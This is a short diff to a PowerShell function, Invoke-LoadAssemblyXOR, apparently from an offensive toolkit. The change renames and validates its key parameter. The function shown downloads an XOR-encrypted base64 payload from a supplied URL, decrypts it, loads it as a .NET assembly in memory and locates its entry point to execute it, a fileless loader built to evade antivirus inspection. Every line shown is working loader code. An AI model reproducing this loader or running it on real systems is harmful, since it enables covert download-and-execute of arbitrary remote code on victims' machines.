@@ -38,8 +38,9 @@ function Invoke-LoadAssemblyXOR
         [String]
         $AssemblyUrl,
         [Parameter(Position = 1, Mandatory = $true)]
+        [ValidateNotNullorEmpty()]
         [String]
-        $Key,
+        $KeyString,
         [Parameter(Position = 2, Mandatory = $false)]
         [String]
         $Command
@@ -47,7 +48,7 @@ function Invoke-LoadAssemblyXOR
 
     $WebClient = New-Object System.Net.WebClient
     $xorb64_bin = $WebClient.DownloadString($AssemblyUrl);
-    [Byte[]]$AssemblyBytes = [System.Convert]::FromBase64String((xor $xorb64_bin "decrypt" $Key));
+    [Byte[]]$AssemblyBytes = [System.Convert]::FromBase64String((xor $xorb64_bin "decrypt" $KeyString));
     $assembly = [System.Reflection.Assembly]::Load($AssemblyBytes)
 
     $ep = $assembly.EntryPoint
